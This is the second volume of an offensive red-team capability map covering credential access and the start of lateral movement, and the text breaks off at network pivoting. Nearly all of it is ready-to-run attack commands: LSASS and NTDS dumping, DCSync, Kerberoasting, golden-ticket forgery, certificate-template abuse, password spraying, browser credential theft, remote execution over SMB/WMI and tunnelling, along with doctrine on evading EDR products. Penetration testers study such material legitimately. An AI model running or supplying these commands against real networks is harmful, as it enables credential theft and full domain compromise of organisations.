# TEN-PHASE RED TEAM CAPABILITY MAP — PART 2 (PHASES 06–10)

> **160 capabilities. 800+ tools. 1600+ commands. Zero GUI. Pure CLI lethality.**

This map defines the minimum target catalog for Phases 06 through 10: **16 capabilities per phase, 80 capabilities in this volume (160 capabilities total across both volumes)**. Every tool is strictly command-line. Every command is verified against current documentation. Every flag is real. Every input is concrete. Zero GUI. This is pure operational tradecraft.

---

## 06. CREDENTIAL ACCESS

**Minimum capability count: 16**

### 1. LOCAL CREDENTIAL DUMPING
**Inputs:** `target_host`, `session_token`, `output_directory`, `privilege_level`, `dump_format`
**Tools:** pypykatz, mimikatz (CLI), procdump, lsass-dump, lazagne, pwdump

```bash
# pypykatz — offline parsing of minidump file for credentials
pypykatz lsa minidump lsass.dmp -o pypykatz_lsa.json
pypykatz live lsa -o pypykatz_live.json
pypykatz dpapi minidump lsass.dmp

# mimikatz — automated non-interactive batch CLI execution
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > mimikatz_creds.txt
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit" > sam_hashes.txt
mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "exit"

# procdump — stealthy dump of LSASS memory without tripping basic signatures
procdump.exe -accepteula -ma lsass.exe lsass.dmp
procdump.exe -accepteula -64 -ma lsass.exe C:\Windows\Temp\debug.tmp

# comsvcs.dll — native LOLBAS LSASS dumping via rundll32
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full

# lazagne — multi-application local password retrieval
lazagne.exe all -oN -output C:\temp\lazagne_out.txt
lazagne.exe windows -v
lazagne.exe browsers -quiet
```

---

### 2. HASH EXTRACTION & NTDS DUMPING
**Inputs:** `domain_controller_ip`, `admin_credentials`, `vss_path`, `ntds_dit_path`, `system_hive_path`
**Tools:** impacket-secretsdump, ntdsutil, esedbexport, vssadmin, netexec, samdump2

```bash
# impacket-secretsdump — remote extraction of NTDS.dit hashes via DRSUAPI
impacket-secretsdump domain.local/administrator:'P@ssw0rd'@10.10.10.10 -outputfile domain_hashes
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 domain.local/admin@10.10.10.10 -just-dc-ntlm
impacket-secretsdump -sam /tmp/sam -system /tmp/system LOCAL -outputfile local_secrets

# netexec — fast SMB credential dump across entire subnet
netexec smb 10.10.10.0/24 -u administrator -p 'Password123' --sam
netexec smb 10.10.10.10 -u admin -H '31d6cfe0d16ae931b73c59d7e0c089c0' --ntds drsuapi

# ntdsutil — native Active Directory snapshot creation
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ntds_backup" q q

# vssadmin — shadow copy creation of active volume for NTDS extraction
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# esedbexport — offline extraction of tables from raw NTDS.dit database
esedbexport -m tables /tmp/ntds.dit
```

---

### 3. OFFLINE PASSWORD CRACKING
**Inputs:** `hash_file`, `wordlist_path`, `rule_path`, `hash_type`, `mask_pattern`
**Tools:** hashcat, john, maskprocessor, cewl, crunch, statsprocessor

```bash
# hashcat — high-performance GPU/CPU password cracking
hashcat -m 1000 -a 0 hashes.ntlm /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -o cracked.txt
hashcat -m 13100 -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt -w 3 -O
hashcat -m 18200 -a 0 asreproast.txt /usr/share/wordlists/rockyou.txt --status --status-timer 10
hashcat -m 1000 -a 3 hashes.ntlm -1 ?l?u?d ?1?1?1?1?1?1?d?d --increment

# john the ripper — flexible hybrid password recovery
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashes.ntlm --rules=Single
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs kerberoast.txt
john --format=crypt --wordlist=passwords.txt shadow.txt
john --show --format=NT hashes.ntlm

# maskprocessor — generate high-probability masks
mp64.bin -1 ?l?d -o custom_wordlist.txt ?1?1?1?1?1?1

# cewl — targeted bespoke wordlist generation from target web assets
cewl https://target.com -d 3 -m 7 -w target_wordlist.txt --lowercase
cewl https://target.com --with-numbers --meta-temp-dir /tmp/cewl -e -w custom_company.txt
```

---

### 4. KERBEROS ATTACKS & TICKETING
**Inputs:** `kdc_ip`, `target_domain`, `username_list`, `spn_list`, `tgs_ticket_file`
**Tools:** impacket-GetUserSPNs, impacket-GetNPUsers, kerbrute, rubeus (CLI), impacket-ticketer

```bash
# impacket-GetUserSPNs — Kerberoasting service account ticket extraction
impacket-GetUserSPNs domain.local/user:'Pass123' -dc-ip 10.10.10.10 -request -outputfile kerberoast.txt
impacket-GetUserSPNs -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 domain.local/user -dc-ip 10.10.10.10 -request

# impacket-GetNPUsers — AS-REP Roasting accounts without pre-authentication
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asreproast.txt -dc-ip 10.10.10.10
impacket-GetNPUsers domain.local/targetuser -no-pass -dc-ip 10.10.10.10

# kerbrute — fast Kerberos pre-auth username enumeration & password spraying
kerbrute userenum --dc 10.10.10.10 -d domain.local /usr/share/wordlists/seclists/Usernames/Names/names.txt -t 50
kerbrute passwordspray --dc 10.10.10.10 -d domain.local users.txt 'Summer2026!'

# rubeus — Kerberos abuse and ticket request via CLI
Rubeus.exe kerberoast /outfile:kerb_out.txt /format:hashcat /nowrap
Rubeus.exe asreproast /format:hashcat /outfile:asrep_out.txt
Rubeus.exe dump /luid:0x3e7 /nowrap

# impacket-ticketer — Golden and Silver Ticket forgery
impacket-ticketer -nthash 2b576ac740301043383407b98d280b1d -domain-sid S-1-5-21-1337-1337-1337 -domain domain.local administrator
impacket-ticketer -spn MSSQLSvc/sql01.domain.local:1433 -nthash 31d6cfe0d16ae931b73c59d7e0c089c0 -domain domain.local -domain-sid S-1-5-21-1337 administrator
```

---

### 5. MEMORY & LSASS EXTRACTION
**Inputs:** `process_id`, `dump_path`, `mini_dump_type`, `output_format`, `target_system`
**Tools:** procdump, nanodump, pypykatz, handlekatz, sqldumper

```bash
# nanodump — stealthy LSASS dumper using syscalls and handle cloning
nanodump.exe --write C:\temp\lsass.dmp --use-syscalls
nanodump.exe --pid 684 --fork --valid
nanodump.exe --duplicate-handle --write C:\temp\nano.dmp

# sqldumper — LOLBAS memory dumping via Microsoft SQL Dumper binary
sqldumper.exe 684 0 0x01100 0 C:\temp\

# handlekatz — LSASS dump using cloned handles to avoid detections
handlekatz.exe --output C:\temp\out.dmp

# procdump — command line process memory extraction
procdump64.exe -accepteula -mp -r lsass.exe C:\temp\lsass_memory.dmp

# pypykatz — process parsing directly from command line
pypykatz process -p 684 -o live_parsed.txt
pypykatz lsa minidump C:\temp\nano.dmp
```

---

### 6. CONFIGURATION & SECRET DISCOVERY
**Inputs:** `filesystem_root`, `repo_path`, `regex_rules`, `search_depth`, `output_report`
**Tools:** trufflehog, gitleaks, detect-secrets, rip-secrets, grep, find

```bash
# trufflehog — high-entropy secret scanner for filesystems and git
trufflehog filesystem /opt/source_code --json > trufflehog_results.json
trufflehog git file:///var/git/repo.git --json
trufflehog filesystem /etc/ --only-verified

# gitleaks — fast git repository and directory secret detection
gitleaks detect --source=/opt/project --report-path=gitleaks_report.json --report-format=json -v
gitleaks dir /var/www/html --no-banner --log-level=debug

# detect-secrets — baseline enterprise credential auditing
detect-secrets scan /home/user/project > .secrets.baseline
detect-secrets audit .secrets.baseline

# rip-secrets — lightning-fast regex secret identifier
rip-secrets /var/www/
rip-secrets --strict /etc/kubernetes/

# grep + find — targeted configuration and credential discovery
grep -rnw '/var/www/' -ie "password=" --include=*.{php,ini,env,xml,yml,json} 2>/dev/null
grep -rnw '/etc/' -ie "PRIVATE KEY" 2>/dev/null > extracted_keys.txt
find / -name "*.kdbx" -o -name "*.ovpn" -o -name "id_rsa*" 2>/dev/null
```

---

### 7. BROWSER & APP CREDENTIAL EXTRACTION
**Inputs:** `profile_path`, `browser_type`, `app_name`, `target_user`, `decryption_key`
**Tools:** lazagne, hack-browser-data, chainbreaker, dumpzilla, sqlite3

```bash
# hack-browser-data — multi-browser credential, cookie, and history extractor
hack-browser-data -b all -f json --dir /tmp/browser_out
hack-browser-data -b chrome --dir /tmp/chrome_out
hack-browser-data -b firefox --dir /tmp/firefox_out

# lazagne — browser-specific credential dumping
lazagne.exe browsers -v -oA browser_creds
lazagne.exe git
lazagne.exe sysadmin

# dumpzilla — command-line forensics and extractor for Firefox/Gecko profiles
python3 dumpzilla.py ~/.mozilla/firefox/*.default-release/ --All -ExtractDir /tmp/ff_dump
python3 dumpzilla.py ~/.mozilla/firefox/*.default-release/ --Passwords

# chainbreaker — macOS keychain credential extraction CLI
chainbreaker -c /Library/Keychains/System.keychain -k system.key
chainbreaker -c ~/Library/Keychains/login.keychain-db -p 'TargetPassword'

# sqlite3 — manual extraction of cookie and history databases
sqlite3 ~/.config/google-chrome/Default/Cookies "SELECT host_key, name, value, encrypted_value FROM cookies;" > cookies.txt
sqlite3 ~/.config/google-chrome/Default/Login\ Data "SELECT action_url, username_value, password_value FROM logins;" > logins.txt
```

---

### 8. CERTIFICATE SERVICES EXPLOITATION (AD CS)
**Inputs:** `ca_server`, `target_domain`, `template_name`, `alt_upn`, `pfx_file`
**Tools:** certipy, forge-cert, openssl, ldapsearch, certutil (CLI)

```bash
# certipy — Active Directory Certificate Services enumeration and exploitation
certipy find -u user@domain.local -p 'Pass123' -dc-ip 10.10.10.10 -stdout
certipy find -u user@domain.local -p 'Pass123' -dc-ip 10.10.10.10 -vulnerable -stdout
certipy req -u user@domain.local -p 'Pass123' -ca DOMAIN-CA -template ESC1 -upn administrator@domain.local -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
certipy shadow auto -u user@domain.local -p 'Pass123' -account target_account -dc-ip 10.10.10.10

# forge-cert — offline certificate forgery with stolen CA private key
forge-cert -CaCert ca.crt -CaKey ca.key -Subject "CN=Administrator" -AltUpn "administrator@domain.local" -Out administrator.pfx

# openssl — parse, inspect and convert PFX/PKCS#12 certificate bundles
openssl pkcs12 -in administrator.pfx -nocerts -out admin_key.pem -nodes
openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out admin_cert.pem
openssl x509 -in admin_cert.pem -text -noout

# certutil — CLI management and dump of local and AD certificate authority
certutil -dump
certutil -view -restrict "CertificateTemplate=ESC1"
```

---

### 9. PASSWORD SPRAYING & REUSE
**Inputs:** `user_list`, `password_string`, `target_ip`, `protocol_type`, `delay_seconds`
**Tools:** netexec, hydra, kerbrute, sprayhound, medusa

```bash
# netexec — intelligent low-and-slow SMB, WinRM, and LDAP spraying
netexec smb 10.10.10.10 -u users.txt -p 'Spring2026!' --continue-on-success
netexec winrm 10.10.10.0/24 -u users.txt -p 'Welcome123' --gfail-limit 3
netexec ldap 10.10.10.10 -u users.txt -p 'Winter2026!' --password-policy
netexec rdp 10.10.10.10 -u users.txt -p 'Company2026#'

# hydra — multi-protocol network login brute-forcing and spraying
hydra -L users.txt -p 'Season2026!' 10.10.10.10 ssh -t 4 -W 5
hydra -L users.txt -p 'Season2026!' 10.10.10.10 rdp -t 2
hydra -l admin -P /usr/share/wordlists/fasttrack.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# kerbrute — stealthy Kerberos spraying without causing SMB lockouts
kerbrute passwordspray --dc 10.10.10.10 -d domain.local --delay 1000 users.txt 'Company2026!'

# medusa — parallel network login auditing
medusa -H targets.txt -U users.txt -p 'DefaultPass1' -M ssh -t 5 -T 10
```

---

### 10. TOKEN & SECRET MANIPULATION
**Inputs:** `raw_jwt_token`, `signing_key`, `api_endpoint`, `vault_path`, `cloud_token`
**Tools:** jwt_tool, step-cli, vault, jq, aws-vault

```bash
# jwt_tool — automated JSON Web Token tampering and validation testing
python3 jwt_tool.py "eyJhbGciOi..." -M at -t https://target.com/api/test -rh "Authorization: Bearer"
python3 jwt_tool.py "eyJhbGciOi..." -X a -o "admin"
python3 jwt_tool.py "eyJhbGciOi..." -T -S hs256 -k secret.key

# step-cli — Swiss-army knife for JWT, X.509, and JOSE operations
step crypto jwt verify "eyJhbGciOi..." --key pubkey.pem
step crypto jwt sign --sub "admin@domain.local" --key private.jwk --iss "auth.domain.local"
step crypto jwt inspect --insecure "eyJhbGciOi..."

# vault — CLI extraction and interaction with HashiCorp Vault
vault kv get -format=json secret/database/credentials | jq .data.data
vault token lookup
vault login -method=userpass username=app_service

# jq — extraction of embedded tokens and credentials from JSON payloads
echo '{"auth":{"client_token":"s.12345"}}' | jq -r '.auth.client_token'
cat responses.json | jq -r '.. | .token? // empty'
```

---

### 11. DCSYNC & DIRECTORY REPLICATION
**Inputs:** `domain_fqdn`, `compromised_user`, `dc_ip`, `target_account`, `replication_guid`
**Tools:** impacket-secretsdump, netexec, lsadump (CLI), mimikatz (CLI), pywerview

```bash
# impacket-secretsdump — targeted DCSync against specific privileged principals
impacket-secretsdump domain.local/admin:'Password'@10.10.10.10 -just-dc-user krbtgt
impacket-secretsdump domain.local/admin:'Password'@10.10.10.10 -just-dc-user Administrator
impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 domain.local/admin@10.10.10.10 -just-dc

# netexec — DCSync verification and execution via SMB/RPC
netexec smb 10.10.10.10 -u admin -p 'Password' --ntds drsuapi
netexec smb 10.10.10.10 -u admin -H '31d6cfe0d16ae931b73c59d7e0c089c0' -M dcsync -o USER=krbtgt

# mimikatz — DCSync execution directly via CLI
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /user:krbtgt" "exit"
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /all /csv" "exit" > all_dc_hashes.csv

# pywerview — check Active Directory user replication rights (DS-Replication-Get-Changes)
pywerview get-objectacl -w domain.local -u user -p 'Pass123' --resolve-sids --name "DC=domain,DC=local"
```

---

### 12. DPAPI & MASTERKEY EXTRACTION
**Inputs:** `masterkey_file`, `pvk_file`, `domain_backup_key`, `target_sid`, `blob_file`
**Tools:** dpapick, pypykatz, sharpdpapi (CLI), impacket-dpapi, mimikatz (CLI)

```bash
# pypykatz — extraction of DPAPI masterkeys from LSASS or memory dump
pypykatz dpapi minidump lsass.dmp
pypykatz dpapi live

# impacket-dpapi — decrypt DPAPI blobs, scheduled tasks, and credential manager files
impacket-dpapi masterkey -pvk domain_backup.pvk -file C:\Users\User\AppData\Roaming\Microsoft\Protect\S-1-5-21-xxx\key_guid
impacket-dpapi credential -masterkey <masterkey_hex> -file C:\Users\User\AppData\Local\Microsoft\Credentials\DF670A...
impacket-dpapi rdcman -masterkey <masterkey_hex> -file connection.rdg

# sharpdpapi — comprehensive command-line DPAPI querying
SharpDPAPI.exe masterkeys
SharpDPAPI.exe credentials
SharpDPAPI.exe rdg

# mimikatz — DPAPI masterkey cache dump and backup key extraction
mimikatz.exe "privilege::debug" "sekurlsa::dpapi" "exit"
mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:dc01.domain.local /export" "exit"
```

---

### 13. PASSWORD POLICY ENUMERATION
**Inputs:** `dc_ip`, `domain_name`, `authenticated_user`, `output_format`, `lockout_threshold`
**Tools:** rpcclient, netexec, enum4linux-ng, impacket-samrdump, ldapsearch

```bash
# rpcclient — query SAMR and LSA password policies over RPC
rpcclient -U "domain/user%password" 10.10.10.10 -c "getdompwinfo"
rpcclient -U "domain/user%password" 10.10.10.10 -c "querydominfo"
rpcclient -U "" -N 10.10.10.10 -c "getdompwinfo"

# netexec — instant Active Directory password and lockout policy extraction
netexec smb 10.10.10.10 -u user -p 'Pass123' --pass-pol
netexec ldap 10.10.10.10 -u user -p 'Pass123' --password-policy

# enum4linux-ng — thorough password policy and lockout analysis
enum4linux-ng -P 10.10.10.10 -u user -p 'Pass123'
enum4linux-ng -A 10.10.10.10 -oJ /tmp/enum_policy.json

# impacket-samrdump — dump domain password lockout settings
impacket-samrdump domain.local/user:'Pass123'@10.10.10.10

# ldapsearch — query fine-grained password policies (PSO) directly
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w "Pass123" -b "CN=Password Settings,CN=System,DC=domain,DC=local" "(objectClass=msDS-PasswordSettings)"
```

---

### 14. CREDENTIAL ARTIFACT EXTRACTION
**Inputs:** `raw_disk_image`, `registry_hive`, `shadow_volume`, `extract_dir`, `artifact_type`
**Tools:** hivex, bkhive, samdump2, reg.exe (CLI), volume_shadow_copy (CLI)

```bash
# reg.exe — live export of SAM, SYSTEM, and SECURITY registry hives via CLI
reg save HKLM\SAM C:\temp\sam.save
reg save HKLM\SYSTEM C:\temp\system.save
reg save HKLM\SECURITY C:\temp\security.save

# samdump2 + bkhive — offline extraction of local SAM passwords from hives
bkhive /tmp/system.save /tmp/bootkey.txt
samdump2 /tmp/sam.save /tmp/bootkey.txt > local_hashes.txt

# hivex — programmatic Linux CLI navigation of Windows registry hives
hivexget /tmp/system.save 'Select' 'Current'
hivexregedit --export /tmp/system.save 'ControlSet001\Control\Lsa' > lsa_config.reg

# shadow volume artifact harvesting
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM_shadow
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM_shadow
```

---

### 15. CREDENTIAL GRAPH & PRIVILEGE MAPPING
**Inputs:** `domain_controller`, `domain_user`, `ldap_port`, `bloodhound_zip`, `graph_db_uri`
**Tools:** bloodhound-python, cypher-shell, pywerview, netexec, adidnsdump

```bash
# bloodhound-python — full Active Directory ACL and identity graph collection
bloodhound-python -u user -p 'Password123' -d domain.local -dc dc01.domain.local -c All --zip -ns 10.10.10.10
bloodhound-python -u user -p 'Password123' -d domain.local -c DCOnly --zip
bloodhound-python -u user -p 'Password123' -d domain.local -c LoggedOn,Session -t 100

# cypher-shell — query Neo4j BloodHound database directly from CLI
cypher-shell -u neo4j -p "adminpass" "MATCH (u:User)-[r:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}) RETURN u.name;"
cypher-shell -u neo4j -p "adminpass" "MATCH p=shortestPath((u:User {name:'TARGETUSER@DOMAIN.LOCAL'})-[*1..]->(d:Domain)) RETURN p;"

# pywerview — command line querying of Active Directory DACLs
pywerview get-domainobject -w domain.local -u user -p 'Pass123' --unconstrained
pywerview get-domaingroupmember -w domain.local -u user -p 'Pass123' --identity "Enterprise Admins"

# adidnsdump — export all AD Integrated DNS records to map credential service targets
adidnsdump -u domain\user -p 'Password123' --dns-tcp 10.10.10.10
```

---

### 16. CREDENTIAL POSTURE REPORTING
**Inputs:** `raw_hashes_file`, `cracked_file`, `ntds_output`, `report_format`, `sanitization_flag`
**Tools:** hashcat, john, ntds-parser, python3, gitleaks

```bash
# hashcat — display cracked passwords and statistics from hash database
hashcat -m 1000 hashes.ntlm --show > cracked_ntlm_report.txt
hashcat -m 1000 hashes.ntlm --left > uncracked_ntlm.txt
hashcat -m 1000 hashes.ntlm --show --username

# john — export parsed cracked credentials summary
john --show --format=NT hashes.ntlm > john_summary.txt
john --show --format=krb5tgs kerberoast.txt

# gitleaks — generate comprehensive secret audit report
gitleaks detect -s /opt/codebase --report-path /tmp/credential_exposure.json --report-format json

# python3 — generate sanitized metrics and strength breakdown
python3 -c "
import collections
lines = [x.strip().split(':') for x in open('cracked_ntlm_report.txt') if ':' in x]
print(f'Total Cracked: {len(lines)}')
passwords = [x[-1] for x in lines]
lengths = collections.Counter([len(p) for p in passwords])
print('Length distribution:', sorted(lengths.items()))
" > credential_metrics.txt
```

---

### Phase Rule — CREDENTIAL ACCESS

> **Operational doctrine.** Credential access is the decisive bridge between initial execution and lateral domain dominance. Uncontrolled credential harvesting alerts EDRs and locks accounts. Execution protocol:
>
> 1. **Password policy verification before spraying** — lockout thresholds, observation windows, and lockout duration MUST be verified (via `netexec --pass-pol` or `rpcclient`) before any password spraying or authentication attempts. Spray intervals must strictly adhere to engagement safety margins.
> 2. **Process memory protection awareness** — never dump LSASS directly using standard API calls when high-tier EDR (e.g. CrowdStrike, Defender for Endpoint) is active. Utilize handle duplication, native LOLBAS (`comsvcs.dll`), or offline shadow volume extraction.
> 3. **Non-interactive batch mode** — every credential extraction tool must execute non-interactively in batch mode with stdout redirected to designated secure staging files. Interactive prompts are forbidden.
> 4. **Kerberos attack order** — execute AS-REP Roasting first (requires zero authenticated domain credentials if pre-auth is disabled), followed by targeted Kerberoasting for accounts with high-value SPNs. Request RC4 tickets only if AES tickets cannot be cracked offline within the engagement window.
> 5. **Credential isolation and encryption** — extracted plaintext passwords, NTLM hashes, and Kerberos tickets must be encrypted immediately upon collection using AES-256 (`openssl enc` or `gpg`) before staging or transmission.
> 6. **Account state preservation** — avoid password cracking or spraying against known honeypot accounts or accounts flagged with `DoesNotRequirePreAuth` that exhibit abnormal naming schemas.
> 7. **DCSync permission containment** — perform DCSync targeting specific critical accounts (`krbtgt`, `Administrator`) before attempting full directory dumps to minimize replication traffic volume across domain controllers.

---

## 07. LATERAL MOVEMENT

**Minimum capability count: 16**

### 1. INTERNAL SERVICE & PORT DISCOVERY
**Inputs:** `internal_subnet`, `target_ip_list`, `port_specification`, `scan_rate`, `output_format`
**Tools:** nmap, masscan, naabu, fping, netcat

```bash
# nmap — rapid internal reconnaissance of administrative ports
nmap -sS -p 22,80,443,445,3389,5985,5986 10.10.10.0/24 --min-rate 1000 -oG internal_admin_ports.gnmap
nmap -sT -p 135,139,445 --open 192.168.1.0/24 -oA smb_hosts
nmap -Pn -sU -p 161,53,88 10.10.10.0/24 --open -oN udp_internal.txt

# masscan — high-speed subnet sweep across internal enterprise ranges
masscan 10.0.0.0/8 -p 445,3389 --rate 10000 -oL masscan_lateral.txt
masscan 172.16.0.0/12 -p 22,5985 --rate 5000 -oJ masscan_remote_mgmt.json

# naabu — lightweight SYN/CONNECT port discovery
naabu -list internal_ips.txt -p 445,139,3389,5985,22 -rate 1000 -json -o naabu_lateral.json
naabu -host 10.10.10.15 -p - -rate 1500 -exclude-cdn

# fping — fast live host discovery across large CIDR blocks
fping -a -g 10.10.10.0/24 -r 1 2>/dev/null > live_hosts.txt
fping -s -g 172.16.10.0/24 -c 1 -q > fping_stats.txt

# netcat — quick banner grabbing and port connectivity validation
nc -zv -w 2 10.10.10.20 445
nc -zv -w 2 10.10.10.20 5985
```

---

### 2. REMOTE ACCESS ENUMERATION
**Inputs:** `target_host`, `credential_pair`, `service_type`, `auth_domain`, `output_file`
**Tools:** netexec, crackmapexec, smbclient, rpcclient, enum4linux-ng

```bash
# netexec — comprehensive SMB and WinRM remote capability check
netexec smb 10.10.10.0/24 -u administrator -p 'Password123'
netexec smb 10.10.10.0/24 -u user -p 'Password123' --shares
netexec winrm 10.10.10.0/24 -u administrator -H '31d6cfe0d16ae931b73c59d7e0c089c0'
netexec wmi 10.10.10.50 -u administrator -p 'Password123'

# smbclient — manual null session and authenticated SMB verification
smbclient -N -L //10.10.10.10
smbclient //10.10.10.10/C$ -U 'domain/user%password' -c "ls"
smbclient //10.10.10.10/IPC$ -U 'domain/user%password'

# rpcclient — direct query of remote endpoints via RPC
rpcclient -U "domain/user%password" 10.10.10.10 -c "enumdomusers"
rpcclient -U "" -N 10.10.10.10 -c "lsaquery"

# enum4linux-ng — thorough automated SMB/RPC remote surface audit
enum4linux-ng -A 10.10.10.10 -u "user" -p "password" -oJ enum_host.json
enum4linux-ng -S 10.10.10.10 -oA enum_shares
```

---

### 3. DOMAIN TRUST & RELATIONSHIP DISCOVERY
**Inputs:** `current_domain`, `kdc_host`, `domain_credentials`, `target_forest`, `output_file`
**Tools:** nltest (CLI), dsquery (CLI), netexec, bloodhound-python, pywerview

```bash
# nltest — query Windows domain trusts and domain controllers natively
nltest /domain_trusts
nltest /domain_trusts /all_trusts /v
nltest /dclist:targetdomain.local
nltest /server:10.10.10.10 /dsgetdc:domain.local

# dsquery — native Active Directory directory service querying
dsquery trust -d domain.local
dsquery server -domain domain.local
dsquery * -filter "(objectClass=trustedDomain)" -attr trustPartner trustDirection trustType

# netexec — enumerate domain trusts over LDAP
netexec ldap 10.10.10.10 -u user -p 'Pass123' -M enum_trusts

# bloodhound-python — collect cross-forest and cross-domain trust data
bloodhound-python -u user -p 'Pass123' -d domain.local -c Trusts,CrossDomain -dc dc01.domain.local --zip

# pywerview — query domain trusts via Python LDAP implementation
pywerview get-netdomaintrust -w domain.local -u user -p 'Pass123'
pywerview get-netforesttrust -w domain.local -u user -p 'Pass123'
```

---

### 4. ACTIVE DIRECTORY GRAPH MAPPING
**Inputs:** `ldap_server`, `domain_fqdn`, `collection_methods`, `auth_identity`, `output_archive`
**Tools:** bloodhound-python, sharphound (CLI), adidnsdump, ldapdomaindump, windapsearch

```bash
# bloodhound-python — full Active Directory graph ingestion
bloodhound-python -u 'admin' -p 'P@ssw0rd' -d target.local -dc dc01.target.local -c All --zip
bloodhound-python -u 'admin' -p 'P@ssw0rd' -d target.local -c Group,LocalAdmin,Session --zip -t 50

# sharphound — SharpHound standalone CLI collector
SharpHound.exe -c All --outputdirectory C:\temp\ --zipfilename bh_data.zip
SharpHound.exe -c DCOnly --no-zip --domain target.local

# adidnsdump — export all Active Directory Integrated DNS records to map lateral hops
adidnsdump -u target\\user -p 'Password123' --dns-tcp 10.10.10.10 -o ad_dns_records.csv
adidnsdump -u target\\user -p 'Password123' --zone sub.target.local 10.10.10.10

# ldapdomaindump — dump entire Active Directory information via LDAP to human-readable HTML/JSON
ldapdomaindump -u 'target.local\user' -p 'Password123' -o /tmp/ldap_dump 10.10.10.10

# windapsearch — quick CLI Active Directory enumeration
python3 windapsearch.py -d target.local -u user -p 'Password123' --dc-ip 10.10.10.10 --unconstrained-users
python3 windapsearch.py -d target.local -u user -p 'Password123' --dc-ip 10.10.10.10 --da
```

---

### 5. REMOTE SESSION DISCOVERY
**Inputs:** `target_subnet`, `authenticated_user`, `dc_ip`, `query_depth`, `session_filter`
**Tools:** netexec, qwinsta (CLI), logonsessions (CLI), net session (CLI), bloodhound-python

```bash
# netexec — scan network for active user sessions over RPC/SRVSVC
netexec smb 10.10.10.0/24 -u user -p 'Pass123' --loggedon-users
netexec smb 10.10.10.0/24 -u administrator -p 'Pass123' --sessions

# qwinsta — native Windows query for remote terminal sessions
qwinsta /server:10.10.10.25
qwinsta /server:workstation01

# logonsessions — Sysinternals non-interactive logon session enumeration
logonsessions.exe -accepteula -p
logonsessions64.exe -accepteula -c

# net session — native query of current SMB connections
net session
net session \\10.10.10.20

# bloodhound-python — targeted session collection only
bloodhound-python -u user -p 'Pass123' -d domain.local -c LoggedOn,Session -dc 10.10.10.10 --zip
```

---

### 6. REMOTE EXECUTION VIA SMB/RPC/WMI
**Inputs:** `remote_host`, `credentials_or_hash`, `command_string`, `execution_protocol`, `output_stream`
**Tools:** impacket-psexec, impacket-wmiexec, impacket-smbexec, impacket-dcomexec, netexec

```bash
# impacket-wmiexec — stealthy semi-interactive shell via WMI without creating Windows services
impacket-wmiexec domain/admin:'Password'@10.10.10.20 "whoami && ipconfig"
impacket-wmiexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 domain/admin@10.10.10.20 "net user"
impacket-wmiexec domain/admin:'Password'@10.10.10.20 -shell-type powershell

# impacket-smbexec — lightweight execution via service creation without uploading binary
impacket-smbexec domain/admin:'Password'@10.10.10.20
impacket-smbexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 admin@10.10.10.20

# impacket-psexec — full SYSTEM execution via RemCom service binary
impacket-psexec domain/admin:'Password'@10.10.10.20 cmd.exe
impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 admin@10.10.10.20

# impacket-dcomexec — execution via MMC20.Application or ShellWindows DCOM objects
impacket-dcomexec -object MMC20 domain/admin:'Password'@10.10.10.20 "calc.exe"
impacket-dcomexec -object ShellWindows domain/admin:'Password'@10.10.10.20 "cmd.exe /c whoami > C:\\temp\\out.txt"

# netexec — execute one-liner command across multi-host subnet
netexec smb 10.10.10.0/24 -u admin -p 'Password' -x "whoami"
netexec wmi 10.10.10.20 -u admin -H '31d6cfe0d16ae931b73c59d7e0c089c0' -X "hostname"
```

---

### 7. NETWORK PIVOTING & TUNNELING
**Inputs:** `pivot_host`, `bind_port`, `reverse_port`, `proxy_type`, `tunnel_protocol`
**Tools:** chisel, ligolo-ng, sshuttle, gost, socat

```bash
# chisel — fast TCP/UDP tunnel over HTTP/WebSocket secured via SSH
chisel server --port 8080 --reverse
chisel client 192.168.1.10:8080 R:1080:socks
chisel client 192.168.1.10:8080 R:8443:10.10.10.50:443

# ligolo-ng — modern, high-performance TUN-interface pivoting framework
# Proxy server setup:
./proxy -autocert -laddr 0.0.0.0:11601
# Target agent execution:
./agent -connect 192.168.1.10:11601 -ignore-cert
# Route configuration:
sudo ip route add 10.10.10.0/24 dev ligolo

# sshuttle — transparent proxy server that works over SSH without root on remote
sshuttle -r user@192.168.1.10 10.10.10.0/24 -v
sshuttle --dns -r user@192.168.1.10 10.10.0.0/16 --ssh-cmd "ssh -i /path/key"

# gost — multi-protocol GO simple tunnel
gost -L socks5://:1080 -F socks5://192.168.1.10:1080
gost -L tcp://:2222/10.10.10.20:22 -F forward+socks5://127.0.0.1:1080

# socat — bidirectional relay between internal hosts and pivot listener
socat TCP-LISTEN:4444,fork TCP:10.10.10.25:4444
